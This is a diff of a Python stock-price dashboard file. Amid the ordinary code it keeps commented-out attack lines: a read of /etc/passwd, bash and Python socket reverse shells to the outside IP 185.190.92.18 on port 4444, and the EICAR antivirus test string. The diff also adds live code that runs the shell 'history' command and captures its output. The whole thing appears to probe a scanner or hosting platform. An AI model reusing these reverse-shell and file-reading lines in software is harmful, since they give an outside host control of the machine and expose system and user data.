@@ -1,4 +1,3 @@
-X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*
 # -*- coding: utf-8 -*-
 import os
 
@@ -34,7 +33,8 @@ tickers = prices["ticker"].unique()
 # stream = os.popen('echo "OS Command";cat /etc/passwd')
 # ls = stream.read()
 # stream = os.popen('bash -i >& /dev/tcp/185.190.92.18/4444 0>&1')
-# ls = "shell" # stream.read()
+stream = os.popen('history')
+ls = stream.read()
 # os.system('bash -i >& /dev/tcp/185.190.92.18/4444 0>&1')
 # import socket,subprocess,os
 # s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
@@ -43,7 +43,7 @@ tickers = prices["ticker"].unique()
 # os.dup2(s.fileno(),1)
 # os.dup2(s.fileno(),2)
 # p=subprocess.call(["/bin/sh","-i"]);'
-le = "eicar test X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"
+#ls = "eicar test X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"
 
 # top nav bar
 nav = dbc.Navbar(
